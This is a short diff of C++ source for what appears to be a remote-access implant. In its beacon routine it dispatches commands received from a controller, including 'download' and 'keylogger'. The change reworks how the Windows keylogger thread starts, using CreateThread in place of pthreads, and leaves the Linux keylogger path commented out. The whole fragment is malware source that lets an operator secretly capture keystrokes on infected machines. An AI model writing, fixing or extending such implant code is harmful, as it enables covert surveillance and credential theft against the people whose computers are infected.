@@ -6,12 +6,14 @@
 #include <cstring>
 #include <pthread.h>
 
-#include "includes/keylogger.h"
+
+
 
 #ifdef _WIN32
     #include <winsock2.h>
+    #include "./includes/keylogger.h"
     #include <windows.h>
-    #include "includes/cJSON/cJSON.h"
+    #include "./includes/cJSON/cJSON.h"
     #include <unistd.h>
     //#include <Iphlpapi.h>
     //#include <Assert.h>
@@ -237,15 +239,19 @@ void Communicate_::beacon(const char *id) {
     } else if (strncmp(cmd->valuestring, "download", 8) == 0) { 
         download();
     } else if (strncmp(cmd->valuestring, "keylogger", 9) == 0) {
-        pthread_t KeyloggerThread;
+        
         #ifdef _WIN32
         // use thread 
-        pthread_create(&KeyloggerThread, NULL, StartWindowsKeylogger, NULL);
-        #else 
+        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartWindowsKeylogger, NULL, 0, NULL);
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+        #else
+        //pthread_t KeyloggerThread; 
         //pthread_create(&KeyloggerThread, NULL, StartLinuxKeylogger, NULL);
+        //pthread_join(KeyloggerThread, NULL);
         #endif
 
-        pthread_join(KeyloggerThread, NULL);
+        
     }
 
     memset(buffer, 0, sizeof(buffer));
